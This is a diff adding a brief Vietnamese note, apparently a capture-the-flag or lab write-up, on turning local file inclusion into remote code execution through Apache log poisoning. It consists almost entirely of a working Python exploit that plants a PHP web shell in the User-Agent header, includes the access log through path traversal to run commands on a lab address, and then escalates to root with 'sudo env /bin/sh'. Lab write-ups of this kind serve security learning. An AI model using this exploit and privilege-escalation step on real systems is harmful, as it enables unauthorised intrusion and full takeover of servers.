@@ -1,0 +1,22 @@
+bài này lfi to rce qua file log
+
+payload để lấy payload 1 +2 :
+import requests
+import base64
+import bs4
+import urllib
+headers = {"User-Agent":"<?php system($_GET['cmd']); ?>"}
+y = "../../../../var/log/apache2/access.log"
+x=input("cmd:")
+url = "http://10.10.212.238/?view=dog../../../../../../../../var/log/apache2/access.log&ext=&cmd="+x
+print(url)
+x = requests.get(url,headers=headers)
+#print(x.text)
+ana = bs4.BeautifulSoup(x.text,'html.parser')
+anaa=ana.select('body div')
+xyz = anaa[0].getText()
+print(xyz[61:])
+
+rce rồi lấy payload 3 qua suid :
+sudo env /bin/sh
+=> root 
